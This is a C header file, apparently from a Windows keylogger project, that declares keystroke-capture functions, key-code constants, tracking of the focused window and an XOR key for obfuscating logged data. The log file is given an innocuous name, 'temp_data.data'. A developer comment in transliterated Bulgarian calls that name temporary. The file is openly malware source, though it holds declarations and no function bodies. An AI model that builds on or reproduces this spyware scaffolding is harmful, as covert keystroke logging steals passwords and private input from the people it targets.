#ifndef __KEYLOGGER_H
#define __KEYLOGGER_H

#include <stdio.h>

#define KEYLOGGER_CMD_NONE 0
#define KEYLOGGER_CMD_BLOCK 1
#define KEYLOGGER_MSG_TIMER() Sleep(100)
#define KEYLOGGER_FILE_NAME "temp_data.data" //it will be dynamic @GRESHKA shte go mahna skoro, vremenno

#define KEY_EMPTY 0xFF
#define KEY_CAPS 0x14
#define KEY_SHIFT 0xA0
#define KEY_BACKSPACE 0x8
#define KEY_SPACE 0x20
#define KEY_ENTER 0xD
#define KEY_TAP 0x9
#define KEY_CTRL 0xA2

#define KEY_DATA_XOR_KEY 0xD3
#define KEY_DATA_CMD_STARTED 0x1
#define KEY_DATA_CMD_FOCUSWIN 0x2
#define KEY_DATA_CMD_FOCUSWIN_OFF_SIZE 0x1

#define KEY_DATAPLUS_LEN 22
#define KEY_DATAPLUS_VKCODE 0
#define KEY_DATAPLUS_ASCII 1
#define KEY_DATAPLUS_ASCII_SHIFT 2

extern FILE *flog;
extern int keylogger_IsRunning;
extern char keylogger_CMD;
extern unsigned long keylogger_GetSize(void);
extern void keylogger_PrepareToRead(void);
extern void keylogger_Clear(void);
extern void keylogger_Start(void);

#endif